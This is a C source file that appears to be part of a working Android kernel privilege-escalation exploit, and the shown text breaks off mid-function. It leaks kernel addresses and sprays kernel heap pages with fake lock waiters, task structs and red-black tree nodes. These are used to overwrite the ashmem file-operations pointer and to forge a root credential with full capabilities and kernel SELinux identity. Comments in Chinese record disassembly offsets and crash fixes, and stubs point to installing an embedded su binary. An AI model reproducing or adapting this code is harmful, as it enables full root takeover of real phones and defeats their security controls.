#include "common.h"
#include "kernelsnitch/kernelsnitch.h"

static struct kernelsnitch_shared_state *ks;
static size_t mm_objs_per_slab;
static unsigned char *skb_buf;
static int reclaim_sv[2] = {-1, -1};
static struct mm_ctx prepare_ctx;
static struct mm_ctx spray_ctx;
static struct mm_ctx pre_ctx;
static struct mm_ctx post_ctx;
static pid_t child_leak;

uintptr_t page_base;
uintptr_t fake_lock;
uintptr_t fake_w0;
uintptr_t fake_task;
uintptr_t fake_parent;
uintptr_t fake_right;
uintptr_t fake_left;
uintptr_t fake_fops;
uintptr_t binwrite_target;
char ashmem_path[256] = "/dev/ashmem";

void setup_kernelsnitch(void) {
  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
  ks = kernelsnitch_setup(
      MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 0, 0);
}

int kernelsnitch_collisions_ready(void) {
  return kernelsnitch_found_collisions(ks);
}

void run_kernelsnitch_bruteforce(void) {
  kernelsnitch_bruteforce(ks);
}

uintptr_t current_kernelsnitch_mm_struct(void) {
  return ks->mm_struct;
}

uintptr_t cleanup_kernelsnitch(void) {
  uintptr_t leaked = kernelsnitch_cleanup(ks);
  ks = NULL;
  return leaked;
}

__attribute__((weak))
int install_embedded_su(pid_t *daemon_pid) {
  if (daemon_pid) {
    *daemon_pid = -1;
  }
  errno = ENOSYS;
  return 0;
}

__attribute__((weak))
int install_embedded_wallpaper(void) {
  errno = ENOSYS;
  return 0;
}

void read_first_line(const char *path, char *buf, size_t len) {
  if (!len) {
    return;
  }
  snprintf(buf, len, "unreadable");
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    return;
  }
  ssize_t n = read(fd, buf, len - 1);
  int saved_errno = errno;
  close(fd);
  if (n <= 0) {
    errno = saved_errno;
    snprintf(buf, len, "unreadable");
    return;
  }
  buf[n] = 0;
  buf[strcspn(buf, "\r\n")] = 0;
}

void log_startup_context(void) {
  char attr[256];
  char enforce[32];
  char status[4096];
  char limits[160] = "NoNewPrivs=? Seccomp=? Seccomp_filters=?";
  read_first_line("/proc/self/attr/current", attr, sizeof(attr));
  read_first_line("/sys/fs/selinux/enforce", enforce, sizeof(enforce));
  int fd = open("/proc/self/status", O_RDONLY | O_CLOEXEC);
  if (fd >= 0) {
    ssize_t n = read(fd, status, sizeof(status) - 1);
    close(fd);
    if (n > 0) {
      status[n] = 0;
      const char *names[] = {"NoNewPrivs:", "Seccomp:", "Seccomp_filters:"};
      char values[3][32] = {"?", "?", "?"};
      for (size_t i = 0; i < 3; i++) {
        char *p = strstr(status, names[i]);
        if (p) {
          p += strlen(names[i]);
          while (*p == '\t' || *p == ' ') {
            p++;
          }
          size_t len = strcspn(p, "\r\n");
          if (len >= sizeof(values[i])) {
            len = sizeof(values[i]) - 1;
          }
          memcpy(values[i], p, len);
          values[i][len] = 0;
        }
      }
      snprintf(limits, sizeof(limits), "NoNewPrivs=%s Seccomp=%s "
               "Seccomp_filters=%s", values[0], values[1], values[2]);
    }
  }
  pr_success("startup context pid=%d uid=%u euid=%u gid=%u egid=%u attr=%s enforce=%s\n",
             getpid(), getuid(), geteuid(), getgid(), getegid(), attr,
             enforce);
  pr_success("startup limits pid=%d %s\n", getpid(), limits);
  pr_success("build config pid=%d label=%s slide=pselect main=pselect\n",
             getpid(), BUILD_VARIANT_LABEL);
  pr_success("p0 profile pid=%d phys_offset=%016llx kernel_phys_load=%016llx "
             "delta=%016llx slide_logger=%016llx bootid_data=%016llx "
             "init_task=%016llx root_tg=%016llx sysctl_bootid=%016llx\n",
             getpid(), (unsigned long long)P0_PHYS_OFFSET,
             (unsigned long long)P0_KERNEL_PHYS_LOAD,
             (unsigned long long)P0_KERNEL_PHYS_DELTA,
             (unsigned long long)SLIDE_NFULNL_LOGGER,
             (unsigned long long)SLIDE_RANDOM_BOOT_ID_DATA,
             (unsigned long long)SLIDE_INIT_TASK,
             (unsigned long long)SLIDE_ROOT_TASK_GROUP,
             (unsigned long long)SLIDE_SYSCTL_BOOTID);
}

void log_slide_child_context(void) {
  char attr[256];
  char enforce[32];
  read_first_line("/proc/self/attr/current", attr, sizeof(attr));
  read_first_line("/sys/fs/selinux/enforce", enforce, sizeof(enforce));
  pr_success("slide child context route=%s pid=%d uid=%u euid=%u gid=%u "
             "egid=%u attr=%s enforce=%s\n",
             "pselect", getpid(), getuid(), geteuid(), getgid(), getegid(),
             attr, enforce);
}

void disable_rseq_for_thread(void) {
  return;
}

long futex_op(uint32_t *uaddr, int op, uint32_t val,
              const struct timespec *timeout, uint32_t *uaddr2,
              uint32_t val3) {
  return syscall(SYS_futex, uaddr, op, val, timeout, uaddr2, val3);
}

long sched_setattr_tid(int tid, int nice_value) {
  struct local_sched_attr attr;
  memset(&attr, 0, sizeof(attr));
  attr.size = sizeof(attr);
  attr.sched_policy = SCHED_BATCH;
  attr.sched_nice = nice_value;
  return syscall(SYS_sched_setattr, tid, &attr, 0);
}

int try_cache_ashmem_path(const char *path) {
  int fd = open(path, O_RDWR | O_CLOEXEC);
  if (fd < 0) {
    return 0;
  }

  close(fd);
  snprintf(ashmem_path, sizeof(ashmem_path), "%s", path);
  return 1;
}

int same_rdev_path(const char *path, dev_t rdev) {
  struct stat st;
  if (stat(path, &st) != 0) {
    return 0;
  }
  return S_ISCHR(st.st_mode) && st.st_rdev == rdev;
}

void init_ashmem_path(void) {
  char boot_id[128];
  int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
  if (fd >= 0) {
    ssize_t n = read(fd, boot_id, sizeof(boot_id) - 1);
    close(fd);
    if (n > 0) {
      boot_id[n] = 0;
      boot_id[strcspn(boot_id, "\r\n")] = 0;

      char path[256];
      snprintf(path, sizeof(path), "/dev/ashmem%s", boot_id);
      if (try_cache_ashmem_path(path)) {
        return;
      }
    }
  }

  struct stat base;
  int have_base = stat("/dev/ashmem", &base) == 0;
  have_base = have_base && S_ISCHR(base.st_mode);
  DIR *dir = opendir("/dev");
  if (dir && have_base) {
    struct dirent *de;
    while ((de = readdir(dir)) != NULL) {
      if (strncmp(de->d_name, "ashmem", 6) != 0 ||
          strcmp(de->d_name, "ashmem") == 0) {
        continue;
      }

      char path[256];
      snprintf(path, sizeof(path), "/dev/%s", de->d_name);
      if (same_rdev_path(path, base.st_rdev) &&
          try_cache_ashmem_path(path)) {
        closedir(dir);
        return;
      }
    }
  }
  if (dir) {
    closedir(dir);
  }
}

int open_ashmem_device(void) {
  return SYSCHK(open(ashmem_path, O_RDWR | O_CLOEXEC));
}

int has_zero_byte(uintptr_t value) {
  for (int i = 0; i < 8; i++) {
    if (((value >> (i * 8)) & 0xff) == 0) {
      return 1;
    }
  }
  return 0;
}

uintptr_t p0_data_alias(uintptr_t image_addr) {
  uintptr_t off = image_addr - KIMAGE_TEXT_BASE;
  uintptr_t phys = P0_KERNEL_PHYS_LOAD + off;
  return ((phys - P0_PHYS_OFFSET) | P0_PAGE_OFFSET);
}

uintptr_t p0_alias_image_offset(uintptr_t data_alias) {
  return (data_alias - P0_PAGE_OFFSET) - P0_KERNEL_PHYS_DELTA;
}

uintptr_t data_addr(uintptr_t image_addr) {
  return p0_data_alias(image_addr);
}

uintptr_t kaslr_image_addr(uintptr_t image_addr) {
  if (!kaslr_done) {
    return image_addr;
  }
  return kaslr_base + (image_addr - KIMAGE_TEXT_BASE);
}

uintptr_t text_addr(uintptr_t image_addr) {
  return kaslr_image_addr(image_addr);
}

uintptr_t slide_canon_addr(uintptr_t data_alias) {
  return kaslr_base + p0_alias_image_offset(data_alias);
}

uintptr_t canon_addr(uintptr_t image_addr) {
  return text_addr(image_addr);
}

void put64(unsigned char *p, size_t off, uint64_t value) {
  memcpy(p + off, &value, sizeof(value));
}

void put32(unsigned char *p, size_t off, uint32_t value) {
  memcpy(p + off, &value, sizeof(value));
}

void put_fake_fops_table(unsigned char *p, size_t off) {
  put64(p, off + FOPS_OWNER_OFF, 0);
  put64(p, off + FOPS_LLSEEK_OFF,
        fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
  put64(p, off + FOPS_READ_OFF, 0);
  put64(p, off + FOPS_WRITE_OFF, 0);
  put64(p, off + FOPS_READ_ITER_OFF, text_addr(CONFIGFS_READ_ITER));
  put64(p, off + FOPS_WRITE_ITER_OFF, text_addr(CONFIGFS_BIN_WRITE_ITER));
  put64(p, off + FOPS_IOCTL_OFF, text_addr(ASHMEM_IOCTL));
  put64(p, off + FOPS_COMPAT_IOCTL_OFF, text_addr(ASHMEM_COMPAT_IOCTL));
  put64(p, off + FOPS_MMAP_OFF, text_addr(ASHMEM_MMAP));
  put64(p, off + FOPS_OPEN_OFF, text_addr(ASHMEM_OPEN));
  put64(p, off + FOPS_RELEASE_OFF, text_addr(ASHMEM_RELEASE));
  put64(p, off + FOPS_SPLICE_READ_OFF, text_addr(COPY_SPLICE_READ));
  put64(p, off + FOPS_SHOW_FDINFO_OFF, text_addr(ASHMEM_SHOW_FDINFO));
}

int try_put_blob_no_zeros(int fd, const unsigned char *blob, size_t len) {
  char name[ASHMEM_NAME_LEN];
  memset(name, 0x41, sizeof(name));

  for (size_t i = 0; i < len; i++) {
    name[i] = blob[i] ? blob[i] : 1;
  }
  name[len] = 0;
  return ioctl(fd, ASHMEM_SET_NAME, name);
}

int try_put_blob_zero_at(int fd, const unsigned char *blob, size_t pos) {
  char name[ASHMEM_NAME_LEN];
  memset(name, 0x41, sizeof(name));

  for (size_t i = 0; i < pos; i++) {
    name[i] = blob[i] ? blob[i] : 1;
  }
  name[pos] = 0;
  return ioctl(fd, ASHMEM_SET_NAME, name);
}

int try_set_ashmem_name_blob(int fd, const unsigned char *blob, size_t len) {
  if (try_put_blob_no_zeros(fd, blob, len) != 0) {
    return -1;
  }

  for (size_t i = len; i > 0; i--) {
    if (blob[i - 1] == 0 &&
        try_put_blob_zero_at(fd, blob, i - 1) != 0) {
      return -1;
    }
  }
  return 0;
}

pid_t clone_child(void) {
  pid_t child = SYSCHK(syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0));
  if (child == 0) {
    SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
    if (getppid() == 1) {
      _exit(0);
    }
    pin_to_core(CORE);
    for (;;) {
      pause();
    }
  }
  return child;
}

int g_leak_sock = -1; /* mt47-c: parent-side socket for SCM_RIGHTS fd (no CLOEXEC on received fd) */

pid_t clone_leak_child(void) {
  int sv[2];
  int have_sock = (socketpair(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0, sv) == 0);
  pid_t child = SYSCHK(syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0));
  if (child == 0) {
    alarm(60);  /* mt18-diag watchdog: leak child must not wedge forever */
    if (have_sock) close(sv[0]);
    /* mt47-c ★自开 pin★ open("/proc/self/mem") 走 mm==current->mm 捷径,
     * 不查 SELinux/dumpable(反汇编 __ptrace_may_access@b9c 同 mm 短路;
     * mm_access 亦有 mm==current->mm 直接返回), 结构性 100% 成功。
     * fd 持 mm_count 引用(mem_release 反汇编: [file+0xd8]=mm, 原子减 [mm+0x58]),
     * 经 SCM_RIGHTS 转移给父进程 → pin 语义与父进程 open /proc/pid/mem 完全等价,
     * 且从出生即 pin, 消灭"EACCES 时序竞争"与"zombie 静默丢 pin"两个故障模式。 */
    if (have_sock) {
      int mfd = open("/proc/self/mem", O_RDONLY);
      char ok = 0;
      if (mfd >= 0) {
        struct iovec iov = { .iov_base = &ok, .iov_len = 1 }; /* ok=1 via send below */
        char cmb[CMSG_SPACE(sizeof(int))];
        struct msghdr msg;
        memset(&msg, 0, sizeof(msg));
        msg.msg_iov = &iov;
        msg.msg_iovlen = 1;
        msg.msg_control = cmb;
        msg.msg_controllen = sizeof(cmb);
        struct cmsghdr *cm = CMSG_FIRSTHDR(&msg);
        cm->cmsg_level = SOL_SOCKET;
        cm->cmsg_type = SCM_RIGHTS;
        cm->cmsg_len = CMSG_LEN(sizeof(int));
        memcpy(CMSG_DATA(cm), &mfd, sizeof(int));
        ok = 1;
        if (sendmsg(sv[1], &msg, 0) != 1) ok = 0;
        close(mfd); /* 引用已随 cmsg 转移, 本地可关 */
      }
      if (!ok) {
        char c = 0;
        ssize_t w = write(sv[1], &c, 1);
        (void)w;
      }
      close(sv[1]);
    }
    kernelsnitch_find_collisions(ks);
    exit(0);
  }
  if (have_sock) {
    close(sv[1]);
    g_leak_sock = sv[0];
  }
  return child;
}

/* mt47-c: 在原 open_memfd(leak_child) 的调用点替换调用本函数。
 * 阻塞毫秒级(子进程出生即 sendmsg), EOF/失败返回 -1 → 调用点 fallback 旧路径。 */
int leak_memfd_recv(void) {
  if (g_leak_sock < 0) return -1;
  char c = 0;
  struct iovec iov = { .iov_base = &c, .iov_len = 1 };
  char cmb[CMSG_SPACE(sizeof(int))];
  struct msghdr msg;
  memset(&msg, 0, sizeof(msg));
  msg.msg_iov = &iov;
  msg.msg_iovlen = 1;
  msg.msg_control = cmb;
  msg.msg_controllen = sizeof(cmb);
  ssize_t r = recvmsg(g_leak_sock, &msg, 0);
  int fd = -1;
  if (r == 1 && c == 1) {
    struct cmsghdr *cm = CMSG_FIRSTHDR(&msg);
    if (cm && cm->cmsg_level == SOL_SOCKET && cm->cmsg_type == SCM_RIGHTS &&
        cm->cmsg_len >= CMSG_LEN(sizeof(int))) {
      memcpy(&fd, CMSG_DATA(cm), sizeof(int));
    }
  }
  close(g_leak_sock);
  g_leak_sock = -1;
  pr_info("mt47-c: leak pin via SCM_RIGHTS %s (fd=%d)\n",
          fd >= 0 ? "OK" : "FAIL->fallback", fd);
  fflush(stdout);
  return fd;
}

int open_memfd(pid_t child) {
  char path[64];
  snprintf(path, sizeof(path), "/proc/%d/mem", child);
  int fd = open(path, O_RDONLY);
  /* mt47-diag: SYSCHK 只打 %m 丢细节, 且不知道哪个 pid 挂了。
   * 失败时抓 4 个证据: errno / 子进程域 / 父进程域 / 子进程是否已死。
   * 只打印不改变任何控制流 — 不碰时序。 */
  if (fd < 0) {
    int e = errno;
    char dom[128];
    int dfd;
    dom[0] = 0;
    snprintf(path, sizeof(path), "/proc/%d/attr/current", child);
    dfd = open(path, O_RDONLY);
    if (dfd >= 0) {
      read(dfd, dom, sizeof(dom) - 1);
      close(dfd);
    } else {
      snprintf(dom, sizeof(dom), "(read fail errno=%d)", errno);
    }
    char mydom[128];
    mydom[0] = 0;
    dfd = open("/proc/self/attr/current", O_RDONLY);
    if (dfd >= 0) {
      read(dfd, mydom, sizeof(mydom) - 1);
      close(dfd);
    }
    int st = 0;
    snprintf(path, sizeof(path), "/proc/%d/stat", child);
    dfd = open(path, O_RDONLY);
    if (dfd >= 0) {
      char sb[256];
      ssize_t r = read(dfd, sb, sizeof(sb) - 1);
      close(dfd);
      if (r > 0) {
        sb[r] = 0;
        char *rp = strrchr(sb, ')');
        if (rp && rp[1] == ' ') st = rp[2];
      }
    } else {
      st = '?';
    }
    pr_error("mt47-diag: open_memfd pid=%d FAIL errno=%d state=%c\n"
             "mt47-diag:   child_dom=%s\n"
             "mt47-diag:   parent_dom=%s\n",
             child, e, st, dom, mydom);
    errno = e;
  }
  return fd;
}

void kill_child(pid_t child) {
  if (child <= 0) {
    return;
  }
  SYSCHK(kill(child, SIGKILL));
  /* mt80: 阻塞 waitpid 在 D 状态 SIGKILLed 子进程上会把整轮卡死
   * (2026-09-06 E5 三连卡死根因, 见 CHECKPOINT_mt79)。改为有界轮询:
   * WNOHANG 最多等 ~1s/child, 超时放弃收尸(僵尸在进程退出时由内核回收,
   * 不占内存; D 状态子进程的内存本来也只在真正死亡时才释放)。
   * 主流程永远不能被收尸阻塞。 */
  for (int mt80_i = 0; mt80_i < 50; mt80_i++) {
    if (waitpid(child, NULL, WNOHANG) != 0) {
      return; /* 已回收(reaped) 或出错(已被收/无此进程) */
    }
    usleep(20000); /* 20ms */
  }
  /* 超时放弃: 留 zombie, 不阻塞主流程 */
}

void close_reclaim_sockets(void) {
  for (int i = 0; i < 2; i++) {
    if (reclaim_sv[i] >= 0) {
      close(reclaim_sv[i]);
      reclaim_sv[i] = -1;
    }
  }
}

void close_ctx_memfds(struct mm_ctx *ctx) {
  for (size_t i = 0; i < ctx->mm_cnt; i++) {
    if (ctx->memfds[i] > 0) {
      close(ctx->memfds[i]);
      ctx->memfds[i] = -1;
    }
  }
}

void free_ctx_storage(struct mm_ctx *ctx) {
  free(ctx->childs);
  free(ctx->memfds);
  ctx->childs = NULL;
  ctx->memfds = NULL;
  ctx->mm_cnt = 0;
}

void cleanup_page_prepare_state(void) {
  close_ctx_memfds(&prepare_ctx);
  close_ctx_memfds(&spray_ctx);
  close_ctx_memfds(&pre_ctx);
  close_ctx_memfds(&post_ctx);
  if (memfd_leak > 0) {
    close(memfd_leak);
    memfd_leak = -1;
  }
  free_ctx_storage(&prepare_ctx);
  free_ctx_storage(&spray_ctx);
  free_ctx_storage(&pre_ctx);
  free_ctx_storage(&post_ctx);
  free(skb_buf);
  skb_buf = NULL;
  /* MTK: give kernel time to reclaim freed resources */
  usleep(1000000);
}

int clone_memfd(void) {
  pid_t child = clone_child();
  int fd = open_memfd(child);
  kill_child(child);
  return fd;
}

void prepare_ctxs(void) {
  prepare_ctx.mm_cnt = PREPARE_CTX_FACTOR * mm_objs_per_slab;
  prepare_ctx.childs = calloc(sizeof(pid_t), prepare_ctx.mm_cnt);
  prepare_ctx.memfds = calloc(sizeof(int), prepare_ctx.mm_cnt);

  spray_ctx.mm_cnt = (1 + MM_PARTIALS) * mm_objs_per_slab;
  spray_ctx.childs = calloc(sizeof(pid_t), spray_ctx.mm_cnt);
  spray_ctx.memfds = calloc(sizeof(int), spray_ctx.mm_cnt);

  pre_ctx.mm_cnt = mm_objs_per_slab - 1;
  pre_ctx.childs = calloc(sizeof(pid_t), pre_ctx.mm_cnt);
  pre_ctx.memfds = calloc(sizeof(int), pre_ctx.mm_cnt);

  post_ctx.mm_cnt = mm_objs_per_slab;
  post_ctx.childs = calloc(sizeof(pid_t), post_ctx.mm_cnt);
  post_ctx.memfds = calloc(sizeof(int), post_ctx.mm_cnt);
}

int prepare_skb_payload(uintptr_t base, int payload_mode) {
  memset(skb_buf, 0, SKB_SEND_SIZE);

  uintptr_t payload_base = base + SKB_DATA_DELTA;

  fake_lock = payload_base + LOCK_OFF;
  fake_w0 = payload_base + W0_OFF;
  fake_task = payload_base + FAKE_TASK_OFF;
  fake_fops = payload_base + FOPS_TABLE_OFF;
  if (payload_mode == PAGE_PAYLOAD_FOPS) {
    /* v20: caiman-style GhostLock write chain.
     * fake_parent = ASHMEM_MISC_FOPS - 8 → &parent->rb_right = ASHMEM_MISC_FOPS
     * fake_right = fake_fops → the VALUE to write
     * Chain: fd_set.tree_pc=fake_fops → fops.rb_right=W0.pi_tree
     *   → pi_tree.parent=RIGHT_OFF → RIGHT_OFF.parent=ASHMEM_MISC_FOPS-8
     *   → &parent->rb_right = ASHMEM_MISC_FOPS → write fake_fops there! */
    uintptr_t write_target = data_addr(ASHMEM_MISC_FOPS);
    fake_parent = write_target - 8;   /* &parent->rb_right = write_target */
    fake_right  = fake_fops;          /* value to write */
    fake_left   = 0;
    binwrite_target = payload_base + SCRATCH_OFF;
  } else {
    fake_parent = data_addr(ASHMEM_MISC_FOPS) - 8;
    fake_right = fake_fops;
    fake_left = payload_base + LEFT_OFF;
    binwrite_target = payload_base + FOPS_OFF + 0x700;
  }

  /* v17: page-side pi_tree_entry values, env-overridable */
  uintptr_t write_pc, write_right, write_left;
  {
    char *wpc_env = getenv("PSELECT_WPC");
    char *wr_env  = getenv("PSELECT_WRIGHT");
    char *wl_env  = getenv("PSELECT_WLEFT");
    write_pc    = wpc_env ? (uintptr_t)strtoull(wpc_env, NULL, 16)
                          : (payload_mode == PAGE_PAYLOAD_FOPS
                              ? payload_base + RIGHT_OFF : fake_fops);
    write_right = wr_env  ? (uintptr_t)strtoull(wr_env, NULL, 16)
                          : data_addr(ASHMEM_MISC_FOPS);
    write_left  = wl_env  ? (uintptr_t)strtoull(wl_env, NULL, 16) : 0;
  }
  uint64_t waiter_task = text_addr(INIT_TASK);
  uint64_t task_group = text_addr(ROOT_TASK_GROUP);
  uint64_t pi_top_task = text_addr(INIT_TASK);
  if (payload_mode == PAGE_PAYLOAD_SLIDE) {
    /* 2026-08-15 mt32 fix: env PSELECT_WPC/WRIGHT/WLEFT 优先 (was: 无条件覆盖) */
    if (!getenv("PSELECT_WPC")) write_pc = SLIDE_LOGGERS_0_1;
    if (!getenv("PSELECT_WRIGHT")) write_right = 0;
    if (!getenv("PSELECT_WLEFT")) write_left = SLIDE_RANDOM_BOOT_ID_DATA;
    waiter_task = SLIDE_INIT_TASK;
    task_group = SLIDE_ROOT_TASK_GROUP;
    pi_top_task = SLIDE_INIT_TASK;
  }

  for (size_t chunk = 0; chunk < SKB_SEND_SIZE; chunk += ORDER3_SIZE) {
    unsigned char *p = skb_buf + chunk + SKB_FRAG_BIAS;

    if (payload_mode == PAGE_PAYLOAD_FOPS) {
      /* v20 FOPS: caiman-style chain. Full page layout with W0_OFF fake
       * waiter, RIGHT_OFF/LEFT_OFF rb_nodes with fake_parent = target-8.
       * The fd_set tree_pc points to fake_fops (the fops table), whose
       * FOPS_LLSEEK field leads to W0_OFF's pi_tree_entry, then through
       * RIGHT_OFF to ASHMEM_MISC_FOPS-8 → write hits ASHMEM_MISC_FOPS. */
      put32(p, LOCK_OFF + 0x00, 0);
      put64(p, LOCK_OFF + 0x08, fake_w0);
      put64(p, LOCK_OFF + 0x10, fake_w0);
      put64(p, LOCK_OFF + 0x18, fake_task | 1);

      put64(p, W0_OFF + 0x00, 1);
      put64(p, W0_OFF + 0x08, 0);
      put64(p, W0_OFF + 0x10, 0);
      put32(p, W0_OFF + FAKE_WAITER_TREE_PRIO_OFF, FAKE_WAITER_PRIO);
      put64(p, W0_OFF + FAKE_WAITER_TREE_DEADLINE_OFF, 0);
      put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00, write_pc);
      put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08, write_right);
      put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10, write_left);
      put32(p, W0_OFF + FAKE_WAITER_PI_TREE_PRIO_OFF, FAKE_WAITER_PRIO);
      put64(p, W0_OFF + FAKE_WAITER_PI_TREE_DEADLINE_OFF, 0);
      put64(p, W0_OFF + FAKE_WAITER_TASK_OFF, waiter_task);
      put64(p, W0_OFF + FAKE_WAITER_LOCK_OFF, fake_lock);
      put32(p, W0_OFF + FAKE_WAITER_WAKE_STATE_OFF, 0);
      put64(p, W0_OFF + FAKE_WAITER_WW_CTX_OFF, 0);

      put32(p, FAKE_TASK_OFF + FAKE_TASK_USAGE_OFF, 0x100);
      put32(p, FAKE_TASK_OFF + FAKE_TASK_PRIO_OFF, FAKE_TASK_PRIO);
      put32(p, FAKE_TASK_OFF + FAKE_TASK_NORMAL_PRIO_OFF, FAKE_TASK_PRIO);
      put32(p, FAKE_TASK_OFF + FAKE_TASK_PI_LOCK_OFF, 0);
      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF, 0);
      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08, 0);
      put64(p, FAKE_TASK_OFF + FAKE_TASK_TASK_GROUP_OFF, task_group);
      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_TOP_TASK_OFF, pi_top_task);
      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_BLOCKED_ON_OFF, 0);

      /* RIGHT_OFF / LEFT_OFF: parent = ASHMEM_MISC_FOPS - 8 */
      put64(p, RIGHT_OFF + 0x00, fake_parent);
      put64(p, RIGHT_OFF + 0x08, 0);
      put64(p, RIGHT_OFF + 0x10, 0);

      put64(p, LEFT_OFF + 0x00, fake_parent);
      put64(p, LEFT_OFF + 0x08, 0);
      put64(p, LEFT_OFF + 0x10, 0);

      /* v30 Path C fix: two-level fake rb_nodes for successor erase.
       * SCRATCH_OFF is intermediate node (right child), its left child
       * at SCRATCH_OFF+0x40 is the actual successor.
       * In rb_erase Path C with successor deeper than right child:
       *   parent = __rb_parent(successor) = FOPS-8 (from successor's parent_color)
       *   parent->rb_right = child2 = fake_fops → [FOPS] = fake_fops!
       * The old single-node setup wrote to successor->rb_right (sprayed page)
       * because parent=successor when successor == node->rb_right. */
      {
        uintptr_t fops8_addr = data_addr(ASHMEM_MISC_FOPS) - 8;
        uintptr_t succ_off = SCRATCH_OFF + 0x40;
        /* Intermediate node at SCRATCH_OFF: has a left child → successor deeper */
        put64(p, SCRATCH_OFF + 0x00, fops8_addr | 1ULL);   /* parent_color (don't-care) */
        put64(p, SCRATCH_OFF + 0x08, 0);                   /* rb_right (unused) */
        put64(p, SCRATCH_OFF + 0x10, payload_base + succ_off); /* rb_left→successor! */
        /* Successor at SCRATCH_OFF+0x40: parent=FOPS-8 → erase writes to FOPS */
        put64(p, succ_off + 0x00, fops8_addr | 1ULL);      /* parent_color=FOPS-8|RED */
        put64(p, succ_off + 0x08, fake_fops);               /* rb_right=value to write */
        put64(p, succ_off + 0x10, 0);                      /* rb_left=NULL→this=successor */
      }

      put_fake_fops_table(p, FOPS_TABLE_OFF);
    } else if (payload_mode == PAGE_PAYLOAD_SLIDE) {
      /* SLIDE mode: keep original full layout (LOCK_OFF 区不碰 — ks 会读 mm_struct 字段!) */
      put32(p, LOCK_OFF + 0x00, 0);
      put64(p, LOCK_OFF + 0x08, 0);
      put64(p, LOCK_OFF + 0x10, 0);
      put64(p, LOCK_OFF + 0x18, 0);
      /* mt56: 假 cred 布局按本内核反汇编真值重写 (R 轮 crash 定罪旧布局)。
       * 真值三源铁证:
       *   selinux_task_to_inode+0x40: ldr x8,[x8,#0x78] → security@0x78
       *     (add x8,x0,#0x778=real_cred; ldar; [cred+0x78]; crash far=0x4
       *      = 旧布局 0x80 未写 0x78 → NULL deref)
       *   selinux_capable+0x44: ldr x9,[x0,#0x78] → security@0x78 (二源)
       *   cap_capable+0x04: ldr x8,[x0,#0x88] → user_ns@0x88
       *   cap_task_fix_setuid+0x64/0x68: stp xzr,xzr,[x0,#0x30]; str xzr,[x0,#0x48]
       *     → caps 五连 = 0x30/0x38/0x40/0x48/0x50 (inh/perm/eff/bset/amb)
       *   cap_task_fix_setuid+0x28: ldr w8,[x8,#0x24] → securebits@0x24
       * 布局 (标准 5.10, usage 为 8B):
       *   0x00 usage | 0x04 uid .. 0x20 fsgid | 0x24 securebits
       *   0x30-0x57 五组 caps | 0x58-0x77 keyring 区 (保持 NULL!)
       *   0x78 security | 0x80 user | 0x88 user_ns | 0x90 group_info
       * 旧 mt35 布局系统性 +8 错位: security 0x80❌(真0x78), user_ns 0x90❌
       * (真0x88), group_info 0x98❌(真0x90), caps 0x38-0x58❌(真0x30-0x50),
       * 且 cap_ambient 旧写在 0x58 = 侵入 keyring 区 (非NULL keyring 指针)。
       * ids 全 0 + usage=1 已在正确区域 (skb_buf memset 0 兜底)。 */
      put64(p, 0x3800 + 0x00, 1);                    /* usage = 1 */
      put64(p, 0x3800 + 0x30, 0x1ffffffffffULL);     /* cap_inheritable */
      put64(p, 0x3800 + 0x38, 0x1ffffffffffULL);     /* cap_permitted */
      put64(p, 0x3800 + 0x40, 0x1ffffffffffULL);     /* cap_effective ★ */
      put64(p, 0x3800 + 0x48, 0x1ffffffffffULL);     /* cap_bset */
      put64(p, 0x3800 + 0x50, 0x1ffffffffffULL);     /* cap_ambient */
      /* 0x58-0x77: keyring 区不写 (memset 0 = NULL, 旧布局在此写 caps 会
       * 造成非 NULL 伪 keyring 指针 — 第二颗潜在雷, 一并拆除) */
      put64(p, 0x3800 + 0x78, payload_base + 0x3900); /* security -> fake blob */
      put32(p, 0x3900 + 0x00, 1);                    /* osid = SECINITSID_KERNEL */
      put32(p, 0x3900 + 0x04, 1);                    /* sid = SECINITSID_KERNEL */
      put64(p, 0x3800 + 0x80, P0_DATA_ALIAS_CONST(0xffffffc00a7af660ULL)); /* user = root_user */
      put64(p, 0x3800 + 0x88, P0_DATA_ALIAS_CONST(0xffffffc00a7af6f8ULL)); /* user_ns = init_user_ns */
      put64(p, 0x3800 + 0x90, P0_DATA_ALIAS_CONST(0xffffffc00a7b0b88ULL)); /* group_info = init_groups */
    } else {
      /* legacy non-SLIDE non-FOPS layout */
      put32(p, LOCK_OFF + 0x00, 0);
      put64(p, LOCK_OFF + 0x08, fake_w0);
      put64(p, LOCK_OFF + 0x10, fake_w0);
      put64(p, LOCK_OFF + 0x18, fake_task | 1);

      put64(p, W0_OFF + 0x00, 1);
      put64(p, W0_OFF + 0x08, 0);
      put64(p, W0_OFF + 0x10, 0);
      put32(p, W0_OFF + FAKE_WAITER_TREE_PRIO_OFF, FAKE_WAITER_PRIO);
      put64(p, W0_OFF + FAKE_WAITER_TREE_DEADLINE_OFF, 0);
      put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00, write_pc);
      put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08, write_right);
      put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10, write_left);
      put32(p, W0_OFF + FAKE_WAITER_PI_TREE_PRIO_OFF, FAKE_WAITER_PRIO);
      put64(p, W0_OFF + FAKE_WAITER_PI_TREE_DEADLINE_OFF, 0);
      put64(p, W0_OFF + FAKE_WAITER_TASK_OFF, waiter_task);
      put64(p, W0_OFF + FAKE_WAITER_LOCK_OFF, fake_lock);
      put32(p, W0_OFF + FAKE_WAITER_WAKE_STATE_OFF, 0);
